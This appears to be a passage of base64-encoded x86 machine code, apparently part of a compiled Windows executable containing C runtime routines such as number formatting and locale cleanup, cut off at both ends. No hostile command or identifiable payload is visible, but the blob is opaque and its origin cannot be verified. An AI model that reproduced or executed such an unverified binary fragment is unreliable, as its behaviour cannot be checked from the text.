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AJCADPFiUX8i00cU1ZXM/+FyXUNi0UIiwCLQASLyIlFHFczwDlFIFf/dRQPlcD/dRCNBMUBAAAAUFH/FRxxQQCL2IXbdQczwOmRAAAAfkuB+/D//393Q40MG41BCDvBdjmNBF0IAAAAPQAEAAB3E+g9iP//i/SF9nTMxwbMzAAA6xNQ6B9Y//+L8FmF9nS3xwbd3QAAg8YI6wKL94X2dKaNBBtQV1boNnv//4PEDFNW/3UU/3UQagH/dRz/FRxxQQCFwHQQ/3UYUFb/dQz/FYhwQQCL+Fbollj//1mLx41l8F9eW4tN/DPN6KZV//+L5V3DVYvsg+wQ/3UIjU3w6Bpl////dSCNRfD/dRz/dRj/dRT/dRD/dQxQ6Nz+//+DxByAffwAdAeLTfiDYXD9i+Vdw1WL7FaLdQiF9g+E6gAAAItGDDsFfA5CAHQHUOjnV///WYtGEDsFgA5CAHQHUOjVV///WYtGFDsFhA5CAHQHUOjDV///WYtGGDsFiA5CAHQHUOixV///WYtGHDsFjA5CAHQHUOifV///WYtGIDsFkA5CAHQHUOiNV///WYtGJDsFlA5CAHQHUOh7V///WYtGODsFqA5CAHQHUOhpV///WYtGPDsFrA5CAHQHUOhXV///WYtGQDsFsA5CAHQHUOhFV///WYtGRDsFtA5CAHQHUOgzV///WYtGSDsFuA5CAHQHUOghV///WYtGTDsFvA5CAHQHUOgPV///WV5dw1WL7FaLdQiF9nRZiwY7BXAOQgB0B1Do8Fb//1mLRgQ7BXQOQgB0B1Do3lb//1mLRgg7BXgOQgB0B1DozFb//1mLRjA7BaAOQgB0B1Doulb//1mLRjQ7BaQOQgB0B1DoqFb//1leXcNVi+xWi3UIhfYPhG4DAAD/dgTojVb///92COiFVv///3YM6H1W////dhDodVb///92FOhtVv///3YY6GVW////NuheVv///3Yg6FZW////diToTlb///92KOhGVv///3Ys6D5W////djDoNlb///92NOguVv///3Yc6CZW////djjoHlb///92POgWVv//g8RA/3ZA6AtW////dkToA1b///92SOj7Vf///3ZM6PNV////dlDo61X///92VOjjVf///3ZY6NtV////dlzo01X///92YOjLVf///3Zk6MNV////dmjou1X///92bOizVf///3Zw6KtV////dnToo1X///92eOibVf///3Z86JNV//+DxED/toAAAADohVX///+2hAAAAOh6Vf///7aIAAAA6G9V////towAAADoZFX///+2kAAAAOhZVf///7aUAAAA6E5V////tpgAAADoQ1X///+2nAAAAOg4Vf///7agAAAA6C1V////tqQAAADoIlX///+2qAAAAOgXVf///7a4AAAA6AxV////trwAAADoAVX///+2wAAAAOj2VP///7bEAAAA6OtU////tsgAAADo4FT//4PEQP+2zAAAAOjSVP///7a0AAAA6MdU////ttQAAADovFT///+22AAAAOixVP///7bcAAAA6KZU////tuAAAADom1T///+25AAAAOiQVP///7boAAAA6IVU////ttAAAADoelT///+27AAAAOhvVP///7bwAAAA6GRU////tvQAAADoWVT///+2+AAAAOhOVP///7b8AAAA6ENU////tgABAADoOFT///+2BAEAAOgtVP//g8RA/7YIAQAA6B9U////tgwBAADoFFT///+2EAEAAOgJVP///7YUAQAA6P5T////thgBAADo81P///+2HAEAAOjoU////7YgAQAA6N1T////tiQBAADo0lP///+2KAEAAOjHU////7YsAQAA6LxT////tjABAADosVP///+2NAEAAOimU////7Y4AQAA6JtT////tjwBAADokFP///+2QAEAAOiFU////7ZEAQAA6HpT//+DxED/tkgBAADobFP///+2TAEAAOhhU////7ZQAQAA6FZT////tlQBAADoS1P///+2WAEAAOhAU////7ZcAQAA6DVT////tmABAADoKlP//4PEHF5dw1WL7IPsEFOLXQxXi30Qhdt1EoX/dA6LRQiFwHQDgyAAM8Drf4tFCIXAdAODCP9Wgf////9/dhHo8H3//2oWXokw6Hd9///rWP91GI1N8Oi1X///i0XwM/Y5sKgAAAB1YmaLRRS5/wAAAGY7wXY7hdt0D4X/dAtXVlPoTnX//4PEDOimff//xwAqAAAA6Jt9//+LMIB9/AB0B4tN+INhcP2Lxl5fW4vlXcOF23QGhf90X4gDi0UIhcB02ccAAQAAAOvRjU0MiXUMUVZXU2oBjU0UUVb/cAT/FRhxQQCLyIXJdBA5dQx1motFCIXAdKWJCOuh/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